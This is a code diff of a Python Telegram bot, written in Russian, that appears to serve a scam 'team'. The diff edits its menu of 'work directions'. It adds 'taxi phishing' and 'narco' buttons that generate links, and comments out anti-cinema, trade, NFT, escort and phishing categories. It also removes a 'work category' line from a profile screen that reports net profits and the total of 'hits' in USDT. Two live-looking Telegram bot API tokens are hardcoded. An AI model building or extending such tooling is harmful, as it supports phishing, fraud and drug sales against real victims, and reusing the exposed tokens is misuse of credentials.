@@ -13,7 +13,9 @@ except:
 from aiogram import types, Bot
 
 API_TOKEN = '6362029327:AAGoXaoOjSk7wLaAQA3qQXKPcmmtePktO1k'
+# API_TOKEN = '6930385521:AAFb7zZqIbOYAzDm4y2vKtSXiRttGS2ZmqA'
 bot = Bot(token=API_TOKEN)
+
 
 
 def user_reg(username, id):
@@ -122,17 +124,20 @@ def is_sponsor(id_tg):
 
 async def cats(id_tg):
     user = session.query(User).filter(User.tg_id == id_tg).first()
-    text = f'Ваша категория: {user.category}. Вы можете выбрать новое направление:'
+    text = f'Вы можете выбрать направление:'
     keyboard_markup = types.InlineKeyboardMarkup(row_width=1)
-    keyboard_markup.add(types.InlineKeyboardButton('💖 антикино 💖', callback_data=f'take_cat_антикино'))
-    keyboard_markup.add(types.InlineKeyboardButton('💊 нарко 💊', callback_data=f'take_cat_нарко'))
-    keyboard_markup.add(types.InlineKeyboardButton('💶 трейд 💶', callback_data=f'take_cat_трейд'))
-    keyboard_markup.add(types.InlineKeyboardButton('🖼 нфт 🖼', callback_data=f'take_cat_нфт'))
-    keyboard_markup.add(types.InlineKeyboardButton('🎀 эскорт 🎀', callback_data=f'take_cat_эскорт'))
-    keyboard_markup.add(types.InlineKeyboardButton('🐟 фишинг 🐟', callback_data=f'take_cat_фишинг'))
+    keyboard_markup.add(types.InlineKeyboardButton('🚕 такси фиш 🚕', callback_data=f'new_link_uber_country'))
+    keyboard_markup.add(types.InlineKeyboardButton('💊 нарко 💊', callback_data=f'new_link_narko_country'))
+    # keyboard_markup.add(types.InlineKeyboardButton('💶 трейд 💶', callback_data=f'take_cat_трейд'))
+    # keyboard_markup.add(types.InlineKeyboardButton('🖼 нфт 🖼', callback_data=f'take_cat_нфт'))
+    # keyboard_markup.add(types.InlineKeyboardButton('🎀 эскорт 🎀', callback_data=f'take_cat_эскорт'))
+    # keyboard_markup.add(types.InlineKeyboardButton('🐟 фишинг 🐟', callback_data=f'take_cat_фишинг'))
     image_path = f'{BASE_DIR}/images/direction.jpg'
-    with open(image_path, 'rb') as photo:
-        await bot.send_photo(id_tg, photo, caption=text, reply_markup=keyboard_markup)
+    try:
+        with open(image_path, 'rb') as photo:
+            await bot.send_photo(id_tg, photo, caption=text, reply_markup=keyboard_markup)
+    except:
+        await bot.send_message(chat_id=id_tg, text='Выберите ссылку чего вам нужно сделать', reply_markup=keyboard_markup)
 
 
 def set_category(user_id, category):
@@ -154,7 +159,6 @@ async def profile_bd(user_id):
     keyboard_markup = types.InlineKeyboardMarkup(row_width=1)
     keyboard_markup.add(types.InlineKeyboardButton('Ссылки', callback_data=f'links'))
     text = f'Вы с нами с {user.data_join}\n' \
-           f'Категория ворка: {user.category}\n' \
            f'Профитов, чистыми, на сумму: {share} USDT\n' \
            f'Полная сумма залетов: {full} USDT'
     image_path = f'{BASE_DIR}/images/profile.jpg'
